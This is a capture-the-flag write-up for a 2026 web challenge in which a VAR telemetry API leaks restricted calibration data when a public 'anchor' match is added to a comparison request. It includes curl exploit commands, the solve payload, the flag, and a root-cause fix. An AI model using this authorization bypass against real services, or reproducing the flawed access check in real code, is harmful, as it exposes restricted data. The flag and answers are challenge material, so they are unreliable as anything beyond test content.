# hydra-fc-will-come-back

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Web Exploitation |
| Author | TitanCode |
| Points | Unknown at solve time |
| Solves at time of solving | Unknown at solve time |
| Flag | `zdk{FE3LinG_8aD_fOR_CroAtiA}` |

> Webex follow-up for Hydra FC. Instance:
> `https://offside-11mm-<id>.chals.z0d1ak.org`

## Executive Summary

The challenge is a sequel to the
[Hydra FC forensics challenge](../../Forensics/hydra-fc/README.md). This time
we do not recover hidden telemetry from a packet capture; we interrogate a live
VAR telemetry gateway and file a successful appeal.

The public landing endpoint exposes the incident:

```json
{
  "match_id": "HYD-SS-FINAL",
  "subject": "Shakes equalizer review",
  "published_decision": "OFFSIDE",
  "published_margin_mm": 11
}
```

The attached spec defines the offside calculation and documents two API
operations that are not listed on the landing page: `POST /api/v1/compare` and
`POST /api/v1/appeal`.

The bug is an access-control flaw in `compare`. Restricted fixtures cannot be
retrieved on their own, but if a request includes a public "anchor" match, the
gateway includes restricted calibration/rehearsal fixtures in the same response.
That leaks the validated East camera profile:

```text
EAST-MATCH-043  CAM-EAST  longitudinal_offset_mm = 48  status = match-active
EAST-CAL-042    CAM-EAST  longitudinal_offset_mm = 0   status = validated
```

At the real kick frame, `154828`, the published profile moves Shakes' CAM-EAST
right shoulder from `1000 mm` to `1048 mm`, making him appear `+11 mm` offside.
Replacing only that bad profile with validated `EAST-CAL-042` moves Shakes' line
back to `1000 mm`; the second defender's line remains `1037 mm`, so the correct
margin is:

```text
1000 - 1037 = -37 mm
```

The successful appeal payload is:

```json
{
  "match_id": "HYD-SS-FINAL",
  "kick_frame": 154828,
  "bad_sensor": "CAM-EAST",
  "correct_profile": "EAST-CAL-042",
  "corrected_margin_mm": -37
}
```

The service accepts the appeal, changes the decision to onside, and returns:

```text
zdk{FE3LinG_8aD_fOR_CroAtiA}
```

## Repository Contents

| Path | Purpose | SHA-256 |
| --- | --- | --- |
| [`challenge/webex_hydra-fc-will-come-back.tar.gz`](challenge/webex_hydra-fc-will-come-back.tar.gz) | Original handout archive | `c0ff27a11b2688b1c912116a004f84a07685046f4d70c12abc57da6b7ba10838` |
| [`challenge/hydra_var_telemetry_spec.v3.1.json`](challenge/hydra_var_telemetry_spec.v3.1.json) | Extracted API/decision specification | `1583864c37d61efb66bab980c8cdebaca15f5c1d1ba5131a346eb517500ce1d0` |
| [`solve.py`](solve.py) | Live exploit and offline evidence verifier | `26062dfc15f2bf3986e5172066ec8a735157e257742211a89fb65796321b7ede` |
| [`artifacts/root.json`](artifacts/root.json) | Landing endpoint capture | - |
| [`artifacts/fixtures.json`](artifacts/fixtures.json) | Fixture listing capture | - |
| [`artifacts/match-summary.json`](artifacts/match-summary.json) | Public match summary capture | - |
| [`artifacts/compare-public.json`](artifacts/compare-public.json) | Public final + public anchor comparison capture | - |
| [`artifacts/compare-calibration.json`](artifacts/compare-calibration.json) | Public final + restricted calibration comparison capture | - |
| [`artifacts/compare-rehearsal.json`](artifacts/compare-rehearsal.json) | Public final + restricted rehearsal comparison capture | - |
| [`artifacts/evidence-summary.json`](artifacts/evidence-summary.json) | Derived kick frame, line calculations and appeal payload | `4b987eaf0ee9b0b48ecaffefedf5334df8c5def7d13aa4ff25f4a446cd4b1bcf` |
| [`artifacts/appeal-response.json`](artifacts/appeal-response.json) | Accepted appeal response containing the flag | - |

The solver is dependency-free Python 3.

## 1. Reading the Spec

The handout contains a single JSON schema/specification:

```console
$ tar -tzf webex_hydra-fc-will-come-back.tar.gz
webex_hydra-fc-will-come-back/hydra_var_telemetry_spec.v3.1.json
```

The spec is the key artifact. It defines the decision model:

```text
kick_frame:
  ball.acceleration_mps2 >= 20
  ball.foot_ball_distance_mm <= 80

observation_fusion:
  group_by keypoint
  select maximum_confidence

calibration:
  corrected_x_mm =
    raw_x_mm
    + longitudinal_offset_mm
    + round((deck_pitch_deg - reference_pitch_deg) * mm_per_degree)

attacking_player_line:
  maximum corrected_x_mm among eligible attacking keypoints

defender_line:
  second-largest defending player_line

margin:
  attacking_player_line_mm - defender_line_mm
  > 0  => OFFSIDE
  <= 0 => ONSIDE
```

It also documents two useful API operations:

```text
POST /api/v1/compare
POST /api/v1/appeal
```

`/compare` accepts up to eight match IDs and one or more streams:

```json
{
  "match_ids": ["HYD-SS-FINAL"],
  "streams": ["raw_tracking", "deck_imu", "calibration", "audit"]
}
```

`/appeal` accepts the final evidence tuple:

```json
{
  "match_id": "HYD-SS-FINAL",
  "kick_frame": 154828,
  "bad_sensor": "CAM-EAST",
  "correct_profile": "EAST-CAL-042",
  "corrected_margin_mm": -37
}
```

## 2. Enumerating the Gateway

The root endpoint gives the incident and the visible resources:

```console
$ curl -ks https://offside-11mm-<id>.chals.z0d1ak.org/
```

```json
{
  "service": "Hydra Floating VAR Telemetry Gateway",
  "protocol_version": "FLOAT-VAR-3.1",
  "incident": {
    "match_id": "HYD-SS-FINAL",
    "published_decision": "OFFSIDE",
    "published_margin_mm": 11
  }
}
```

Listing fixtures reveals two public matches and two restricted records:

```console
$ curl -ks 'https://offside-11mm-<id>.chals.z0d1ak.org/api/v1/fixtures?team=hydra'
```

```json
[
  { "id": "HYD-SS-FINAL", "kind": "match",       "access": "public" },
  { "id": "HYD-CAL-EAST-042", "kind": "calibration", "access": "restricted" },
  { "id": "HYD-REHEARSAL-17", "kind": "rehearsal",   "access": "restricted" },
  { "id": "HYD-IU-LEAGUE", "kind": "match",      "access": "public" }
]
```

Directly requesting a restricted summary is blocked:

```console
$ curl -ks https://.../api/v1/matches/HYD-CAL-EAST-042/summary
{"error":"analyst clearance required"}
```

And comparing a restricted fixture by itself is also blocked:

```console
$ curl -ks -X POST https://.../api/v1/compare \
  -H 'content-type: application/json' \
  --data '{"match_ids":["HYD-CAL-EAST-042"],"streams":["calibration"]}'

{"error":"comparison requires a public anchor match"}
```

That error message is the clue: the endpoint is not saying "forbidden"; it says
"bring a public anchor."

## 3. The Access-Control Bug

Adding the public final as an anchor makes the restricted calibration visible:

```console
$ curl -ks -X POST https://offside-11mm-<id>.chals.z0d1ak.org/api/v1/compare \
  -H 'content-type: application/json' \
  --data '{
    "match_ids": ["HYD-SS-FINAL", "HYD-CAL-EAST-042"],
    "streams": ["raw_tracking", "deck_imu", "calibration", "audit"]
  }'
```

The response includes both objects:

```text
HYD-SS-FINAL      raw_tracking=17, deck_imu=17, calibration=4, audit=2
HYD-CAL-EAST-042  raw_tracking=0,  deck_imu=1,  calibration=1, audit=3
```

The hidden calibration fixture leaks:

```json
{
  "id": "EAST-CAL-042",
  "sensor": "CAM-EAST",
  "longitudinal_offset_mm": 0,
  "reference_pitch_deg": 0.18,
  "mm_per_degree": 10,
  "status": "validated"
}
```

The public final, however, used a different East profile:

```json
{
  "id": "EAST-MATCH-043",
  "sensor": "CAM-EAST",
  "longitudinal_offset_mm": 48,
  "reference_pitch_deg": 0.18,
  "mm_per_degree": 10,
  "status": "match-active"
}
```

The audit stream confirms it was activated shortly before the fused frame:

```json
[
  {
    "actor": "hydra-ops",
    "action": "activate-profile",
    "sensor": "CAM-EAST",
    "profile": "EAST-MATCH-043"
  },
  {
    "actor": "var-engine",
    "action": "fuse-frame",
    "frame": 154828,
    "result": "OFFSIDE"
  }
]
```

So the web issue gives us the missing evidence: the East camera was judged using
a match-active profile with a suspicious +48 mm longitudinal offset, while the
validated calibration says the offset should be 0 mm.

## 4. Reproducing the Published Decision

The kick-frame rule from the spec finds exactly one frame:

```text
frame = 154828
ball.acceleration_mps2 = 24.8
ball.foot_ball_distance_mm = 42
```

At this frame, the maximum-confidence observation for Shakes' deciding keypoint
is CAM-EAST's right shoulder:

```text
raw_x_mm              = 1000
profile              = EAST-MATCH-043
longitudinal_offset  = 48
pitch correction     = round((0.18 - 0.18) * 10) = 0
corrected_x_mm       = 1000 + 48 + 0 = 1048
```

The defending line is the second-largest Hydra player line. `THE-PLUG` is the
deepest defender at 1500 mm, so the relevant second defender is `SKIPPER`:

```text
SKIPPER left_knee corrected_x_mm = 1037
```

The published margin therefore reproduces exactly:

```text
attacker_line - defender_line = 1048 - 1037 = +11
```

`+11 > 0`, so the gateway's published result is `OFFSIDE`.

This matters: before correcting anything, our implementation must match the
service's reported `+11 mm`. Otherwise the appeal evidence is not grounded in
the same decision model as the service.

## 5. Correcting the Profile

Now change only one thing: replace the bad active CAM-EAST profile with the
validated hidden one:

```text
EAST-MATCH-043 offset +48  ->  EAST-CAL-042 offset 0
```

Shakes' same right-shoulder observation becomes:

```text
raw_x_mm              = 1000
profile              = EAST-CAL-042
longitudinal_offset  = 0
pitch correction     = 0
corrected_x_mm       = 1000
```

The defender line is unchanged:

```text
SKIPPER left_knee corrected_x_mm = 1037
```

So the corrected margin is:

```text
1000 - 1037 = -37
```

`-37 <= 0`, so the equalizer was onside.

The derived evidence is committed in
[`artifacts/evidence-summary.json`](artifacts/evidence-summary.json), including
the deciding keypoints for both the published and corrected decisions.

## 6. Submitting the Appeal

The working request:

```console
$ curl -ks -X POST https://offside-11mm-<id>.chals.z0d1ak.org/api/v1/appeal \
  -H 'content-type: application/json' \
  --data '{
    "match_id": "HYD-SS-FINAL",
    "kick_frame": 154828,
    "bad_sensor": "CAM-EAST",
    "correct_profile": "EAST-CAL-042",
    "corrected_margin_mm": -37
  }'
```

Response:

```json
{
  "status": "accepted",
  "decision": "ONSIDE",
  "flag": "zdk{FE3LinG_8aD_fOR_CroAtiA}"
}
```

The rejected control tests were useful too:

- `bad_sensor = "EAST-MATCH-043"` is rejected; the API expects the sensor name,
  not the bad profile ID.
- `corrected_margin_mm = 37` is rejected; the sign matters, and the corrected
  call must be onside.

## 7. Reproducing

Against a fresh live instance:

```console
$ python3 solve.py https://offside-11mm-<id>.chals.z0d1ak.org
{
  "match_id": "HYD-SS-FINAL",
  "kick_frame": 154828,
  "bad_sensor": "CAM-EAST",
  "correct_profile": "EAST-CAL-042",
  "corrected_margin_mm": -37
}
{
  "decision": "ONSIDE",
  "flag": "zdk{FE3LinG_8aD_fOR_CroAtiA}",
  "status": "accepted"
}
[+] FLAG: zdk{FE3LinG_8aD_fOR_CroAtiA}
```

After the instance expires, reproduce the calculation from committed captures:

```console
$ python3 solve.py --offline-artifacts artifacts
{
  "match_id": "HYD-SS-FINAL",
  "kick_frame": 154828,
  "bad_sensor": "CAM-EAST",
  "correct_profile": "EAST-CAL-042",
  "corrected_margin_mm": -37
}
{
  "decision": "ONSIDE",
  "flag": "zdk{FE3LinG_8aD_fOR_CroAtiA}",
  "status": "accepted"
}
[+] FLAG: zdk{FE3LinG_8aD_fOR_CroAtiA}
```

To regenerate the evidence summary from the committed captures:

```console
$ python3 solve.py --offline-artifacts artifacts --artifacts-dir artifacts
```

## Root Cause and Fix

- **Root cause:** `POST /api/v1/compare` enforces access control only when the
  request has no public anchor. A mixed request containing one public match and
  one restricted calibration fixture leaks restricted streams. The leaked
  calibration proves the live VAR decision used a bad active profile.
- **Impact:** the attacker can retrieve restricted calibration/audit evidence
  and submit a valid appeal that overturns the published decision.
- **Fix:** authorize each requested `match_id` independently before composing
  the comparison response. A public anchor should not confer access to
  restricted calibration or rehearsal fixtures. Audit endpoints should redact
  profile IDs and calibration residuals unless the caller has analyst clearance.

## Lessons

- Error messages can reveal authorization boundaries. `"comparison requires a
  public anchor match"` described the bypass condition almost exactly.
- Always reproduce the vulnerable system's own result first. Matching the
  published `+11 mm` confirmed the model, the kick frame, the confidence fusion,
  and the defender-line rule before submitting the corrected `-37 mm`.
- Treat calibration as security-sensitive data. A small offset in the right
  sensor changed a goal from onside to offside.
